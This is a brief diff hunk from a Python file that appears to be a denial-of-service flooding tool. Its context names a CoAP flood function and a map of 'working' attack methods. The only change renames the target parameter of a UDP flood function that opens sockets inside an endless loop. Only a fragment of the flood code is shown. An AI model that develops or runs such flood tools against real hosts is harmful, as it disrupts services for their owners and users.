@@ -137,7 +137,7 @@ def coap_flood(ip, port=5683):
 # Map method names to functions after definitions
 method_map = {name: globals()[name] for name in working_methods}
 
-def five_udp_flood(target_ip, port=5357):
+def five_udp_flood(ip, port=5357):
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
